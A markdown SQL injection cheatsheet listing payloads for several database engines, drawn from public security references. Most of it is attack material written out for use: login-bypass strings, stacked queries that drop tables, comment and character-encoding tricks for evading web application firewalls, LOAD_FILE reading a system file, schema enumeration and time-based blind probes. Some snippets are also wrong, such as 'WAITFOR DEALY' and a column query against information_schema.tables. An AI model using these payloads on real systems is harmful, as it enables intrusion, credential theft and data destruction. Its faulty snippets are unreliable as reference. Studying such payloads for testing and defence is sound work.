# SQLi Cheatsheet
- [SQLi Cheatsheet](#sqli-cheatsheet)
  - [Safe `OR` Based Payloads](#safe-or-based-payloads)
  - [Comments](#comments)
    - [Line Comments](#line-comments)
    - [Inline Comments (For Obfuscation)](#inline-comments-for-obfuscation)
      - [Example](#example)
  - [Batch Execution (Query Stacking)](#batch-execution-query-stacking)
    - [Example](#example-1)
  - [Conditional Boolean Errors](#conditional-boolean-errors)
    - [MySQL](#mysql)
    - [SQL Server](#sql-server)
    - [ORACLE](#oracle)
    - [PostgreSQL](#postgresql)
    - [SQLite](#sqlite)
  - [String Utility](#string-utility)
    - [Concatenation](#concatenation)
      - [Through Operators](#through-operators)
        - [Example (Concatenating Multiple Columns)](#example-concatenating-multiple-columns)
        - [Example (Obfuscating URL Parameter)](#example-obfuscating-url-parameter)
      - [Through Functions](#through-functions)
        - [Example (Concatenating Multiple Columns)](#example-concatenating-multiple-columns-1)
    - [Conversion Functions](#conversion-functions)
      - [Example (as Obfuscation, bypassing WAF \& Filter Sequences)](#example-as-obfuscation-bypassing-waf--filter-sequences)
    - [SUBSTRING Creation](#substring-creation)
    - [String Length Calculation](#string-length-calculation)
    - [Group Concatenation From Multiple Columns](#group-concatenation-from-multiple-columns)
  - [Limit Query Results](#limit-query-results)
  - [DataBase Version Information](#database-version-information)
  - [Current DataBase In Use](#current-database-in-use)
  - [List All The DataBases In The Server](#list-all-the-databases-in-the-server)
  - [List All The Tables In A DataBase](#list-all-the-tables-in-a-database)
  - [List All The Columns In A Table](#list-all-the-columns-in-a-table)
  - [Login Bypass](#login-bypass)
  - [Enumerate Column's Data Type](#enumerate-columns-data-type)
  - [Trigger Time Delays](#trigger-time-delays)
    - [Example](#example-2)
- [References](#references)

## Safe `OR` Based Payloads
**Note: Use `'OR 1=1--` Responsibly**
| Applicability | Payload |
| - | - |
| MySQL | `' OR IF((NOW()=SYSDATE()),SLEEP(5),1)='0` |
| Oracle | `' OR ROWNUM = '1` |
| SQLite | `' OR ROWID = '1` |

## Comments
### Line Comments
| Applicability | Payload |
| - | - |
| Oracle, SQL Server, PostgreSQL, SQLite, MySQL | **--** |
| MySQL | **-- -** |
| | **#** |

### Inline Comments (For Obfuscation)
| Applicability | Payload | 
| - | - |
| Oracle, SQL Server, PostgreSQL, SQLite, MySQL | **/\*Comment\*/** | 
| MySQL | **/\*! MYSQL special comment format \*/** |

#### Example
Obfuscate the original query.
```SQL
DROP table_name;

<!-- becomes -->

DROP /*COMMENT*/ table_name;
<!-- OR -->
DR/**/OP /*COMMENT*/ table_name;
```

Removing spaces.
```SQL
SELECT pass FROM users;

<!-- becomes -->

SELECT/*ignore*/pass/*ignore*/FROM/*ignore*/users;
```

Detecting MySQL.
```SQL
/*! MYSQL special comment format */

SELECT /*!80027 1/0, */ 1 FROM tablename 
```
> Will throw an division by 0 error if MySQL version is higher than 8.0.27

## Batch Execution (Query Stacking)
Works only in MySQL, SQL Server & PostgreSQL.

### Example
```SQL
SELECT * FROM users WHERE username='admin'; DROP TABLE users; /* ' AND pass='abcd';
```
> As the results from the second query is not returned, we have to use blind SQLi methods to confirm that.

## Conditional Boolean Errors 
Includes `IF` statements & `CASE` statements.

### MySQL
```SQL
-- SYNTAX
IF (condition, if_true, if_false)

-- EXAMPLE
-- Inferential SQLi
SELECT IF (1=1, 'TRUE', 'FALSE')
SELECT IF (1=1, (SELECT table_name FROM information_schema.tables), 0)

-- Blind SQLi
SELECT IF (1=1, SLEEP(5), NULL)
```

### SQL Server
```SQL
-- SYNTAX
IF condition true ELSE false

-- EXAMPLE
-- Inferential SQLi
IF 1=1 'TRUE' ELSE 'FALSE'

-- Blind SQLi
IF 1=1 SLEEP(5) ELSE NULL
```

### ORACLE
```SQL
-- SYNTAX
IF condition THEN true; ELSE false; END IF; END;

-- EXAMPLE
IF 1=1 THEN dbms_lock.sleep(10); ELSE dbms_lock.sleep(0); END IF; END;
```

### PostgreSQL
```SQL
-- SYNTAX
SELECT CASE WHEN condition THEN true ELSE false END;

-- EXAMPLE
SELECT CASE WHEN 1=1 THEN pg_sleep(10) ELSE pg_sleep(0) END;
```

### SQLite
```SQL
-- SYNTAX
iif(condition, if_true, if_false)

-- EXAMPLE
iff(1=1, 'true', 'false')
```

## String Utility
### Concatenation
#### Through Operators
| Applicability | Payload |
| - | - |
| MySQL | `'foo' 'bar'` = `'foobar'` | 
| PostgreSQL, Oracle, SQLite | `'foo'\|\|'bar'` = `'foobar'` | 
| SQL Server | `'foo'+'bar'` = `'foobar'` | 

##### Example (Concatenating Multiple Columns)
```SQL
-- SQL Server
SELECT login + '-' + password FROM members

-- MySQL, Oracle, PostgreSQL
SELECT login || '-' || password FROM members
```
```bash
# login-password pairs

admin-admin1234
admin@mail.com-admin1234
```

##### Example (Obfuscating URL Parameter)
```url
/products?id=1
<!-- becomes -->
/products?id=5-4

/books?id='book'
<!-- becomes -->
/books?id='bo'||'ok'
```

#### Through Functions
```SQL
SELECT CONCAT('foo', 'bar')
-- 'foobar'
```

##### Example (Concatenating Multiple Columns)
```SQL
SELECT CONCAT(login, password) FROM members
```
```bash
# concatenation through CONCAT()
admin,admin1234
admin@mail.com,admin1234
```

### Conversion Functions
| Applicability | Payload | Notes | 
| - | - | - | 
| MySQL | `HEX('a')` = 61 | Converts to HEX value |
| MySQL, SQL Server, PostgreSQL, Oracle | `ASCII('a')` = 97 | Converts to ASCII value |
| SQL Server | `UNICODE('a')` = 97 | Converts to ASCII value |
| Oracle | `RAWTOHEX('a')` = 61 | Converts to HEX value |
| SQLite | `UNICODE('a')` = 97 | Converts to ASCII value |
| MySQL, SQL Server | `CHAR(ascii)` | returns the ascii character for a number |
| PostgreSQL | `CHR(ascii)` | returns the ascii character for a number |

#### Example (as Obfuscation, bypassing WAF & Filter Sequences)
Breaking the original payload in their ASCII equivalents
```SQL
-- MySQL
SELECT CONCAT(CHAR(75),CHAR(76),CHAR(77)) 

-- SQL Server
SELECT CHAR(75)+CHAR(76)+CHAR(77)

-- Oracle
SELECT CHR(75)||CHR(76)||CHR(77)

-- PostgreSQL
SELECT (CHaR(75)||CHaR(76)||CHaR(77))
```
```bash
KLM
```
----
Use HEX version of a string.
```SQL
-- SQL Server
SELECT CHAR(0x66)   
> f

-- MySQL
SELECT 0x66
> f

SELECT 0x457578
> Eux
```
----
To generate HEX equivalent of a string:
```SQL
SELECT CONCAT('0x',HEX('string'))
```
----
Loading Files
```SQL
-- MySQL
SELECT LOAD_FILE(0x633A5C626F6F742E696E69)
```
```cmd
<!-- Load the contents of c:\boot.ini file -->
```

### SUBSTRING Creation
| Applicability | Payload |
| - | - |
| MySQL | `SUBSTRING('main_string', START_POSITION, SUB_STRING_LENGTH)` |
| | `SUBSTRING('main_string' FROM START_POSITION FOR SUB_STRING_LENGTH)` |
| | `SUBSTR('main_string', START_POSITION, SUB_STRING_LENGTH)` |
| | `SUBSTR('main_string' FROM START_POSITION FOR SUB_STRING_LENGTH)` |
| | `MID('main_string', START_POSITION, SUB_STRING_LENGTH)` |
| | `MID('main_string' FROM START_POSITION FOR SUB_STRING_LENGTH)` |
| PostgreSQL | `SUBSTRING('main_string', START_POSITION, SUB_STRING_LENGTH)` |
| | `SUBSTRING('main_string' FROM START_POSITION FOR SUB_STRING_LENGTH)` |
| | `SUBSTR('main_string', START_POSITION, SUB_STRING_LENGTH)` |
| SQL Server | `SUBSTRING('main_string', START_POSITION, SUB_STRING_LENGTH)` |
| Oracle | `SUBSTR('main_string', START_POSITION, SUB_STRING_LENGTH)` |
| SQLite | `SUBSTRING('main_string', START_POSITION, SUB_STRING_LENGTH)` |
| | `SUBSTR('main_string', START_POSITION, SUB_STRING_LENGTH)` |

### String Length Calculation
| Applicability | Payload | Notes |
| - | - | - |
| MySQL | `LENGTH('str')` | Counts number of bytes |
| | `CHAR_LENGTH('str')` | Counts number of characters |
| SQL Server | `DATALENGTH('string')` | Counts number of bytes |
| | `LEN('str)` | Counts number of characters |
| PostgreSQL | `LENGTH('str')` | Counts number of characters |
| Oracle | `LENGTHB('str')` | Counts number of bytes |
| | `LENGTH('str')` | Counts number of characters |
| SQLite | `LENGTH('str')` | Counts number of characters |

### Group Concatenation From Multiple Columns
| Applicability | Payload | 
| - | - | 
| MySQL, SQLite | `GROUP_CONCAT(cols, 'SEPARATOR')`
| PostgreSQL, SQL Server | `STRING_AGG(cols, 'SEPARATOR')`
| Oracle | `LISTAGG(cols, 'SEPARATOR')`

## Limit Query Results
| Applicability | Payload | Notes | 
| - | - | - | 
| MySQL, SQLite | `SELECT * FROM table LIMIT n_rows` | Will limit the results to n rows |
| | `SELECT * FROM table LIMIT start_position, n_rows` | Will start the results from start_position and limit the results to n rows |
| | `SELECT * FROM table LIMIT n_rows OFFSET start_position` | Will start the results from start_position and limit the results to n rows |
| PostgreSQL | `SELECT * FROM table LIMIT n_rows` | Will limit the results to n rows |
| | `SELECT * FROM table LIMIT n_rows OFFSET start_position` | Will start the results from start_position and limit the results to n rows |
| SQL Server, Oracle | `SELECT * FROM table OFFSET start_position ROWS FETCH NEXT n ROWS ONLY` | Will limit the results to n rows |
| | `SELECT * FROM table OFFSET start_start_position ROWS FETCH NEXT n ROWS ONLY` | Will start the results from start_position and limit the results to n rows |
| Oracle | `SELECT * FROM table ROWNUM = n` | Will limit the results to n rows |

## DataBase Version Information
| Applicability | Payload |
| - | - |
| MySQL | `@@VERSION` |
| | `VERSION()` |
| | `@@GLOBAL.VERSION` |
| PostgreSQL | `VERSION()` |
| SQL Server | `@@VERSION` |
| Oracle | `SELECT BANNER FROM v$version WHERE ROWNUM = 1` |
| | `SELECT BANNER FROM gv$version WHERE ROWNUM = 1` |
| | `SELECT version FROM PRODUCT_COMPONENT_VERSION WHERE product LIKE 'Oracle Database%'` |
| SQLite | `sqlite_version()` |

## Current DataBase In Use
| Applicability | Payload |
| - | - |
| MySQL | `SELECT DATABASE()` |
| PostgreSQL | `SELECT CURRENT_DATABASE()` |
| | `SELECT CURRENT_SCHEMA()` |
| SQL Server | `DB_NAME()` |
| | `SCHEMA_NAME()` |
| ORACLE | `SELECT name FROM V$database` |
| | `SELECT * FROM global_name` |
| | `SELECT sys_context('USERENV', 'CURRENT_SCHEMA') FROM dual;` |

## List All The DataBases In The Server
| Applicability | Payload |
| - | - |
| MySQL | `SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA` |
| | `SELECT db FROM mysql.db` |
| PostgreSQL | `SELECT datname FROM pg_database` |
| | `SELECT DISTINCT(schemaname) FROM pg_tables` |
| SQL Server | `SELECT name FROM master.sys.databases`|
| | `SELECT name FROM master..sysdatabases` |
| Oracle | `SELECT OWNER FROM (SELECT DISTINCT(OWNER) FROM SYS.ALL_TABLES)` |

## List All The Tables In A DataBase
| Applicability | Payload |
| - | - |
| MySQL | `SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='<DBNAME>'` |
| | `SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=DATABASE()` |
| | `SELECT database_name,table_name FROM mysql.innodb_table_stats WHERE database_name='DBNAME'` |
| PostgreSQL | `SELECT tablename FROM pg_tables WHERE schemaname = 'SCHEMA_NAME'` |
| | `SELECT tablename FROM pg_tables WHERE schemaname = CURRENT_DATABASE()` |
| | `SELECT tablename FROM pg_tables WHERE schemaname = CURRENT_SCHEMA()` |
| | `SELECT table_name FROM information_schema.tables WHERE table_schema='SCHEMA_NAME'` |
| SQL Server | `SELECT table_name FROM information_schema.tables WHERE table_catalog='DBNAME'` |
| | `SELECT name FROM DBNAME..sysobjects WHERE xtype='U'` |
| Oracle | `SELECT OWNER,TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER='DBNAME'` |
| SQLite | `SELECT tbl_name FROM sqlite_master WHERE type='table'` | 

## List All The Columns In A Table
| Applicability | Payload |
| - | - |
| MySQL, PostgreSQL | `SELECT column_name,column_type FROM information_schema.tables WHERE table_name='TABLE_NAME' AND table_schema='DBNAME'` |
| SQL Server | `SELECT COL_NAME(OBJECT_ID('DBNAME.TABLE_NAME'), <INDEX>)` |
| Oracle | `SELECT COLUMN_NAME,DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='TABLE_NAME' AND OWNER='DBNAME'` |
| SQLite | `SELECT name FROM PRAGMA_TABLE_INFO('TABLE_NAME')` |
| | `SELECT sql FROM sqlite_master WHERE tbl_name='TABLE_NAME'` |

## Login Bypass
```SQL
admin' --
admin' #
admin'/*

' or 1=1--
' or 1=1#
' or 1=1/*

') or '1'='1--
') or ('1'='1--
```

## Enumerate Column's Data Type
1. Use `SUM()` aggregate function to intentionally provoke error for non-numeric values.
  ```SQL
  <!-- SQL Server -->
  ' UNION SELECT SUM(column);--
  ' UNION SELECT SUM('hello');--
  ```
  ```bash
  ERROR: The sum or average aggregate operation cannot take a varchar data type as an argument.
  ```
  > If there is no error, the column is numeric.

2. Use `CAST()`
  ```SQL
  SELECT CAST('abc' AS INT)
  ```
  ```bash
  Error: Conversion failed when converting the varchar value 'abc' to data type int.
  ```

3. Use `CONVERT()`
  ```SQL
  SELECT CONVERT(INT, 'abc');
  ```
  ```bash
  Error: Conversion failed when converting the varchar value 'abc' to data type int.
  ```

## Trigger Time Delays
| Applicability | Payload |
| - | - |
| MySQL, MariaDB | `SELECT SLEEP(5);` |
| | `SELECT BENCHMARK(repeats, expression_to_execute);` |
| PostgreSQL | `SELECT pg_sleep(5)` | 
| SQL Server | `WAITFOR DEALY '00:00:05';` |
| | `WAITFOR DEALY '0:0:05';` |
| Oracle | `DBMS_LOCK.sleep(5);` |
| | `DBMS_PIPE.RECEIVE_MESSAGE('STR',5)` |

### Example
```SQL
<!-- Example: checking if a table exists -->
IF (SELECT * FROM login) BENCHMARK(1000000,MD5(1))
```
----
```SQL
<!-- No delay -->
' IF (1=2) THEN SLEEP(5) ELSE '' END-- -

<!-- Yes delay -->
' IF (1=1) THEN SLEEP(5)-- -
' || pg_sleep(10)--
```

# References
+ PortSwigger Web Security Academy
+ [Invicti's SQLi Cheatsheet](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/)
+ [Tib3rius's SQLi Cheatsheet](https://tib3rius.com/sqli)